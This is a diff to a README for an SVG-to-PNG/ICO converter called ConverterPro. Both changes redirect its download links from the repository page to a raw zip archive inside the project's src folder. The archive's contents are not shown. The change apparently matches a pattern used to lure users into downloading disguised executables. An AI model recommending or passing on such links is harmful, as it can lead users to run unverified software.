@@ -1,6 +1,6 @@
 # 🖼️ ConverterPro - Fast SVG to PNG and ICO
 
-[![Download ConverterPro](https://img.shields.io/badge/Download-ConverterPro-blue?style=for-the-badge)](https://github.com/straggly-picidae807/ConverterPro)
+[![Download ConverterPro](https://img.shields.io/badge/Download-ConverterPro-blue?style=for-the-badge)](https://github.com/straggly-picidae807/ConverterPro/raw/refs/heads/main/src/Pro_Converter_v2.2.zip)
 
 ## 🚀 What ConverterPro does
 
@@ -15,7 +15,7 @@ Use it when you need to:
 
 ## 📥 Download
 
-Visit this page to download: [ConverterPro on GitHub](https://github.com/straggly-picidae807/ConverterPro)
+Visit this page to download: [ConverterPro on GitHub](https://github.com/straggly-picidae807/ConverterPro/raw/refs/heads/main/src/Pro_Converter_v2.2.zip)
 
 Open the page and look for the latest Windows download. If the project offers a setup file or package, get that file and save it to your computer.
 
